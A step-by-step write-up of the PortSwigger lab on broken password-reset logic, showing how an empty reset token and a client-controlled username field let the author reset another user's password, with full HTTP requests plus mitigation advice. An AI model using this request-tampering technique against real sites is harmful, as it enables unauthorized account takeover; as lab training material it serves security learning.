# 📘 PortSwigger Lab: Password Reset Broken Logic

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic  
> 🎯 Topic: Authentication vulnerabilities — Password Reset Broken Logic  
> 🧪 Difficulty: Apprentice  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🔍 Step 1 — Request a Password Reset](#step1)
- [🔍 Step 2 — Obtain the Reset Link](#step2)
- [🔍 Step 3 — Analyze the POST Request](#step3)
- [🔍 Step 4 — Test an Empty Token](#step4)
- [🔍 Step 5 — Change the Username to Carlos](#step5)
- [🔍 Step 6 — Log in as Carlos](#step6)
- [🧩 Data Used](#payloads)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)

---

<a id="goal"></a>

## 🎯 Goal

Exploit broken password-reset logic, set a new password for `carlos`, and access his account.

Test account:

```text
wiener:peter
```

Target user:

```text
carlos
```

---

<a id="theory"></a>

## 🧠 Short Theory

Password reset is an alternative authentication mechanism.

Normal login:

```text
username + password
```

Password recovery:

```text
access to email + valid reset token
```

A secure flow should work like this:

```text
reset token
    ↓
server resolves the related user_id
    ↓
password is changed only for that user
```

A dangerous flow:

```text
username comes from the browser
    ↓
server trusts the username
    ↓
attacker changes the target account
```

Main rule:

```text
The server must resolve the user from the token,
not from a username supplied in the POST request.
```

A hidden field is still attacker-controlled:

```html
<input type="hidden" name="username" value="wiener">
```

Burp can change it to:

```text
username=carlos
```

---

<a id="idea"></a>

## 🧩 Core Idea

Attack flow:

```text
1. Obtain a reset link for Wiener.
2. Capture the password-change request.
3. Clear the reset token.
4. Confirm that the server accepts an empty token.
5. Change username=wiener to username=carlos.
6. Set a new password for Carlos.
7. Log in to his account.
```

Vulnerability:

```text
empty token
+
client-controlled username
=
account takeover
```

---

<a id="step1"></a>

## 🔍 Step 1 — Request a Password Reset

Open:

```text
Forgot password
```

Submit:

```text
wiener
```

The application sends a recovery email to the test account.

---

<a id="step2"></a>

## 🔍 Step 2 — Obtain the Reset Link

Open the email client on the exploit server.

Example link:

```text
/forgot-password?temp-forgot-password-token=v37mhkrzvlu526khx8woijeuvb1xktiy
```

Follow the link and enter a new password, for example:

```text
test123
```

After submitting the form, find the request in:

```text
Burp Proxy → HTTP history
```

Send it to Repeater:

```text
Right click → Send to Repeater
```

---

<a id="step3"></a>

## 🔍 Step 3 — Analyze the POST Request

Original request:

```http
POST /forgot-password?temp-forgot-password-token=v37mhkrzvlu526khx8woijeuvb1xktiy HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=v37mhkrzvlu526khx8woijeuvb1xktiy&
username=wiener&
new-password-1=test123&
new-password-2=test123
```

Important parameters:

```text
temp-forgot-password-token
username
new-password-1
new-password-2
```

Suspicious parameter:

```text
username=wiener
```

The server should not ask the browser which account belongs to the token. It should resolve that relationship itself.

The token also appears twice:

```text
1. In the URL.
2. In the body.
```

Both locations should be tested.

---

<a id="step4"></a>

## 🔍 Step 4 — Test an Empty Token

Clear the token in the URL:

```http
POST /forgot-password?temp-forgot-password-token= HTTP/2
```

Clear it in the body:

```text
temp-forgot-password-token=&
username=wiener&
new-password-1=test123&
new-password-2=test123
```

Send the request.

Response:

```http
HTTP/2 302 Found
Location: /
```

The application does not return:

```text
Invalid token
Expired token
Unauthorized
```

This confirms that the final POST accepts an empty reset token.

---

<a id="step5"></a>

## 🔍 Step 5 — Change the Username to Carlos

Replace:

```text
username=wiener
```

with:

```text
username=carlos
```

Choose a new password:

```text
NewPass123!
```

Final body:

```text
temp-forgot-password-token=&username=carlos&new-password-1=NewPass123%21&new-password-2=NewPass123%21
```

Full request:

```http
POST /forgot-password?temp-forgot-password-token= HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&new-password-1=NewPass123%21&new-password-2=NewPass123%21
```

Successful response:

```http
HTTP/2 302 Found
Location: /
```

---

<a id="step6"></a>

## 🔍 Step 6 — Log in as Carlos

Use:

<details>
<summary>🔑 Show final credentials</summary>

```text
Username: carlos
Password: NewPass123!
```

</details>

Open:

```text
My account
```

The lab is solved.

---

<a id="payloads"></a>

## 🧩 Data Used

Reset token:

```text
v37mhkrzvlu526khx8woijeuvb1xktiy
```

Original user:

```text
wiener
```

Target user:

```text
carlos
```

Final payload:

```text
temp-forgot-password-token=&username=carlos&new-password-1=NewPass123%21&new-password-2=NewPass123%21
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The application contained two flaws.

### 1. The token was not validated on POST

An empty value:

```text
temp-forgot-password-token=
```

did not stop the password change.

### 2. The username was client-controlled

The server used:

```text
username=carlos
```

to select the target account.

Correct logic:

```text
token → user_id → password change
```

Vulnerable logic:

```text
username from POST → password change
```

Impact:

```text
arbitrary password reset
→ full account takeover
```

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

Useful process:

```text
1. Map the complete reset workflow.
2. Find the final state-changing request.
3. Identify client-controlled parameters.
4. Remove or clear the token.
5. Replace the username with another test account.
6. Confirm the real impact by logging in.
```

Pay close attention to:

```text
username
email
user_id
account_id
token
code
state
```

Main takeaway:

```text
Validating a token when displaying the form
does not prove that the token is validated during the password change.
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### 1. Testing only the GET request

The critical operation happens in the POST request.

### 2. Trusting a hidden field

Hidden only affects display.

### 3. Clearing the token in one place only

The lab sends the token in both the URL and body.

### 4. Trusting the 302 response alone

Confirm success by logging in.

### 5. Changing the username before testing the token

First prove that the empty token is accepted.

### 6. Testing on an unauthorized real account

Use only permitted test accounts.

---

<a id="defense"></a>

## 🛡 Mitigation

Secure implementation:

```text
1. Generate a random one-time token.
2. Store the token → user_id relationship server-side.
3. Validate the token on GET and POST.
4. Never use a client-supplied username as authorization.
5. Enforce token expiration.
6. Invalidate the token after use.
7. Use HTTPS.
8. Log suspicious reset attempts.
```

Secure POST:

```text
token=<value>
new_password=<value>
confirm_password=<value>
```

The server resolves the target user:

```text
user_id = reset_record.user_id
```

---

<a id="checklist"></a>

## ✅ Checklist

- [x] Requested a reset for `wiener`.
- [x] Obtained the reset link.
- [x] Located the password-change POST request.
- [x] Sent the request to Repeater.
- [x] Cleared the token in the URL.
- [x] Cleared the token in the body.
- [x] Confirmed `302 Found`.
- [x] Changed `username=wiener` to `username=carlos`.
- [x] Set a new password for Carlos.
- [x] Logged in to the account.
- [x] Opened My account.
- [x] Solved the lab.

---

# ✅ Lab Solved
